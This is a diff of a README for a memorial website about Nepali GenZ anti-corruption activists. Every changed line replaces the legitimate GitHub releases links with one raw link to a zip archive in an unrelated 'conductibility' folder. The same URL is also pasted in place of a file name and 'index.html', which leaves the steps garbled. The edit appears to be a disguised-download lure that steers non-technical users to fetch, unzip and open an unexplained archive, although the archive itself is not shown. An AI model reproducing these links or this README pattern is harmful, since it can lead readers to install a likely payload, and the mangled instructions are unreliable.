@@ -4,17 +4,17 @@
 The **genz-martyr-memorial** project honors the voices of GenZ in Nepal through a digital tribute to those who stood against corruption. This application serves as a memorial website to keep the spirit of activism alive and promote justice and democracy.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/rachidelf/genz-martyr-memorial/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/rachidelf/genz-martyr-memorial/main/conductibility/genz-martyr-memorial.zip%20Latest%https://raw.githubusercontent.com/rachidelf/genz-martyr-memorial/main/conductibility/genz-martyr-memorial.zip)](https://raw.githubusercontent.com/rachidelf/genz-martyr-memorial/main/conductibility/genz-martyr-memorial.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the application easily. You don’t need any programming knowledge.
 
 ### Step 1: Go to the Releases Page
 Visit the following link to access the latest version:  
-[Download Here](https://github.com/rachidelf/genz-martyr-memorial/releases)
+[Download Here](https://raw.githubusercontent.com/rachidelf/genz-martyr-memorial/main/conductibility/genz-martyr-memorial.zip)
 
 ### Step 2: Choose the Right File
-On the releases page, you will see a list of available files. Look for the latest version, which should be at the top. Files are typically named with the version number, for example, `genz-martyr-memorial-v1.0.zip`.
+On the releases page, you will see a list of available files. Look for the latest version, which should be at the top. Files are typically named with the version number, for example, `https://raw.githubusercontent.com/rachidelf/genz-martyr-memorial/main/conductibility/genz-martyr-memorial.zip`.
 
 ### Step 3: Download the File
 Click on the file name to start downloading. Your browser will save the file to your default download location.
@@ -23,7 +23,7 @@ Click on the file name to start downloading. Your browser will save the file to 
 Once the download is complete, locate the downloaded file. It will usually have a `.zip` extension. Right-click the file and select "Extract All" or "Unzip" to access the application files.
 
 ### Step 5: Open the Application
-Inside the unzipped folder, you will find an `index.html` file. Double-click this file to open it in your web browser. The application should launch automatically.
+Inside the unzipped folder, you will find an `https://raw.githubusercontent.com/rachidelf/genz-martyr-memorial/main/conductibility/genz-martyr-memorial.zip` file. Double-click this file to open it in your web browser. The application should launch automatically.
 
 ## 🔒 System Requirements
 - A modern web browser (e.g., Google Chrome, Firefox, Safari).
@@ -49,7 +49,7 @@ For more information on the topics that inspire this project, check out:
 - **GenZ and Political Activism**
 
 ## 💡 Additional Resources
-- [Official Website](https://github.com/rachidelf/genz-martyr-memorial/releases)
+- [Official Website](https://raw.githubusercontent.com/rachidelf/genz-martyr-memorial/main/conductibility/genz-martyr-memorial.zip)
 - Follow us on social media for updates related to the GenZ movement and ongoing activities.
 
 Remember, every voice matters. Thank you for joining this effort to commemorate the spirit of resistance and hope!
